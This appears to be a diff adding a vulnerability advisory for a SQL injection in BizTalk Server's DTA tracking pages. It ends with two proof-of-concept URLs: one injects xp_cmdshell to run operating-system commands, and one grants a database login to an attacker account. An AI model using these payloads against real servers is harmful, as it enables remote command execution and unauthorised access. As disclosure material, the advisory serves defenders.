@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/7470/info
+ 
+A vulnerability has been reported for BizTalk Server which may make it possible for remote users to modify database query logic. The vulnerability exists in some of the pages used by the DTA interface.
+ 
+This vulnerability may be the result of inadequate sanitization of user-supplied values for some parameters. A remote attacker may exploit this vulnerability by creating a malicious URL that includes specially crafted SQL queries to execute commands or compromise the database. 
+
+http://server/biztalktracking/RawCustomSearchField.asp?nDocumentKey=1,@tnDirection=1;execmaster.dbo.xp_cmdshell 'any OS command'--
+
+http://server/biztalktracking/RawCustomSearchField.asp?nDocumentKey=1,@tnDirection=1;execmaster.dbo.sp_grantlogin 'domain\attacker'-- 
